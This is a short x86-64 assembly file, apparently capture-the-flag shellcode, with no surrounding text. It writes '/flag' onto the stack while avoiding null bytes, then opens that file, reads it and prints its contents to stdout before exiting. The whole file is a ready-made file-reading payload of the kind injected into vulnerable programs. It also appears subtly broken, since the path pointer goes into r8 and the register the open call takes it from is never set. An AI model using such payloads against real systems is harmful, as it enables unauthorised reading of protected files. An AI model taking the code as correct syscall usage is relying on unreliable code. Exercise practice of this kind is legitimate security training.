.global _start
_start:
.intel_syntax noprefix

        #open
        xor esi, esi
        mov byte ptr [rsp], '/'
        mov byte ptr [rsp+1], 'f'
        mov byte ptr [rsp+2], 'l'
        mov byte ptr [rsp+3], 'a'
        mov byte ptr [rsp+4], 'g'
        xor cl, cl
        mov byte ptr [rsp+5], cl
        mov r8, rsp
        xor eax, eax
        mov al, 2
        syscall

        #read
        mov edi, eax
        mov r8, rsp
        mov rsi, r8
        xor edx, edx
        mov dl, 100
        xor eax, eax
        syscall

        #write
        xor edi, edi
        mov dil, 1
        mov r8, rsp
        mov rsi, r8
        #mov rsi, rsp
        mov edx, eax
        xor eax, eax
        inc eax
        syscall

        #exit
        xor eax, eax
        mov al, 60
        xor edi, edi
        mov dil, 42
        syscall
